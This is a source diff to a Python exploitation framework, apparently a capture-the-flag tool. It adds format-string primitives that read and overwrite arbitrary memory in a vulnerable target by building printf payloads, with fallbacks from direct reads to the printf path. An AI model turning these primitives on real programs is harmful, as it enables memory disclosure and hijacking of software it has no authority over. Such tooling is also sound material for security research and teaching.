@@ -6,7 +6,7 @@ import struct
 import itertools
 
 from .errors import * #pylint: disable=wildcard-import
-from .formatter import format_string, offset_read
+from .formatter import absolute_string, offset_read
 from .architectures import x86
 
 # pylint: disable=no-self-use,unused-argument
@@ -68,11 +68,11 @@ class Manipulator:
             try:
                 l.debug("Trying function %s", f.func_name)
                 return f(*args, **kwargs)
-            except CantDoItCaptainError:
+            except NotLeetEnough:
                 l.debug("... failed!")
 
         l.debug("Couldn't find an appropriate vuln :-(")
-        raise CantDoItCaptainError("No %s%s functions available!" % (('safe ' if safe is True else ('unsafe ' if self is False else '')), vuln_type))
+        raise NotLeetEnough("No %s%s functions available!" % (('safe ' if safe is True else ('unsafe ' if self is False else '')), vuln_type))
 
     #
     # Actions!
@@ -80,7 +80,16 @@ class Manipulator:
 
     def do_memory_read(self, addr, length, safe=None):
         ''' Finds and executes an vuln that does a memory read. '''
-        return self._do_vuln('memory_read', (addr, length), { }, safe=True)
+
+        # first, try to do it directly
+        try:
+            l.debug("Trying a direct memory read.")
+            return self._do_vuln('memory_read', (addr, length), { }, safe=True)
+        except NotLeetEnough:
+            l.debug("... l4m3!")
+
+        # now do the printf path
+        return self.do_printf_read(addr, length, safe=safe)
 
     def do_register_read(self, reg, safe=None):
         ''' Finds and executes an vuln that does a register read. '''
@@ -92,43 +101,92 @@ class Manipulator:
         # if safe is None, try safe first, then unsafe
         if safe is None:
             try: return self.do_memory_write(addr, content, safe=True)
-            except CantDoItCaptainError: return self.do_memory_write(addr, content, safe=False)
+            except NotLeetEnough: return self.do_memory_write(addr, content, safe=False)
 
         l.debug("First trying a direct memory write.")
         try:
             return self._do_vuln('memory_write', (addr, content), { }, safe=True)
-        except CantDoItCaptainError:
+        except NotLeetEnough:
             l.debug("... just can't do it, captain!")
 
         l.debug("Now trying a naive printf write.")
-        return self.do_printf((addr, content), safe=None)
+        return self.do_printf_write((addr, content), safe=None)
 
     def do_register_write(self, reg, content, safe=None):
         ''' Finds and executes an vuln that does a register write. '''
         return self._do_vuln('register_write', (reg, content), { }, safe=True)
 
-    def do_printf(self, stuff, safe=None):
-        ''' Finds and executes an vuln that does a memory read. '''
+    def do_printf(self, fmt, safe=None):
+        '''
+        Finds and executes an vuln that does a memory read.
 
-        if type(stuff) is str:
-            # if it's a string, just do the format string
-            return self._do_vuln('printf', (stuff,), { }, safe=None)
-        else:
-            # this is an overwrite of a set of bytes. We don't care about the output.
-            funcs = self._get_vulns('printf', safe)
-            chunks = [ (stuff[0]+i, j) for i,j in enumerate(stuff[1]) ]
+        @param fmt: the format string!
+        @param safe: safety!
+        '''
+        return self._do_vuln('printf', (fmt,), { }, safe=None)
 
-            for c in chunks:
-                for f in funcs:
-                    fmt = format_string((c,), f.puppeteer_flags['bytes_to_fmt'], pad_to=f.puppeteer_flags['max_fmt_size'], word_size=self.arch.bytes, endness=self.arch.endness)
-                    try:
-                        l.debug("Trying format string through %s.", f.func_name)
-                        f(fmt)
-                    except CantDoItCaptainError:
-                        l.debug("... failed")
+    def do_printf_read(self, addr, length, safe=None):
+        '''
+        Do a printf-based memory read.
 
-            return ""
+        @param addr: the address
+        @param safe: safety
+        '''
 
+        funcs = self._get_vulns('printf', safe)
+
+        l.debug("Reading %d bytes from 0x%x using printf", length, addr)
+
+        content = ""
+        while len(content) < length:
+            cur_addr = addr + len(content)
+            left_length = length - len(content)
+
+            for f in funcs:
+                fmt = absolute_string(f.puppeteer_flags['bytes_to_fmt'], reads=(cur_addr,), read_length=left_length, pad_to=f.puppeteer_flags['max_fmt_size'], pad_with="_", word_size=self.arch.bytes, endness=self.arch.endness)
+                try:
+                    l.debug("... trying format string %s through %s.", fmt, f.func_name)
+                    # FIXME: this might be cutting off to much. Do it intelligently
+                    new_content = f(fmt)[self.arch.bytes:-fmt.count("_")]
+                    content += new_content
+                    l.debug("... got: %s (length %d)", new_content, len(new_content))
+                    if f.puppeteer_flags['max_output_size'] is not None:
+                        l.debug("... expected %d bytes", min(f.puppeteer_flags['max_output_size'], left_length))
+
+                    if len(new_content) < left_length:
+                        if not f.puppeteer_flags['max_output_size'] or len(new_content) < f.puppeteer_flags['max_output_size']:
+                            l.debug("... skipping null byte")
+                            # probably was null-terminated
+                            content += '\0'
+                    break
+                except NotLeetEnough:
+                    l.debug("... failed")
+
+        return content
+
+    def do_printf_write(self, writes, safe=None):
+        '''
+        Do a memory write using a printf vulnerability.
+
+        @param writes: a tuple of (addr, bytes) tuples
+        @param safe: whether it's ok for the program to stop functioning afterwards
+        '''
+
+        # this is an overwrite of a set of bytes. We don't care about the output.
+        funcs = self._get_vulns('printf', safe)
+        chunks = [ (writes[0]+i, j) for i,j in enumerate(writes[1]) ]
+
+        for c in chunks:
+            for f in funcs:
+                fmt = absolute_string(f.puppeteer_flags['bytes_to_fmt'], writes=(c,), pad_to=f.puppeteer_flags['max_fmt_size'], word_size=self.arch.bytes, endness=self.arch.endness)
+                try:
+                    l.debug("Trying format string through %s.", f.func_name)
+                    f(fmt)
+                    break
+                except NotLeetEnough:
+                    l.debug("... failed")
+
+        return ""
 
     #
     # More complex stuff
@@ -155,7 +213,7 @@ class Manipulator:
         # if safe is None, try safe first, then unsafe
         if safe is None:
             try: return self.read_stack(length, safe=True)
-            except CantDoItCaptainError: return self.read_stack(length, safe=False)
+            except NotLeetEnough: return self.read_stack(length, safe=False)
 
         # First, try direct memory reads. Then try a printf.
         try:
@@ -163,7 +221,7 @@ class Manipulator:
 
             sp = self.do_register_read(self.arch.sp_name)
             return self.do_memory_read(sp, length)
-        except CantDoItCaptainError:
+        except NotLeetEnough:
             l.debug("... I just can't do it, captain!", exc_info=True)
 
         l.debug("Now trying to use a format string.")
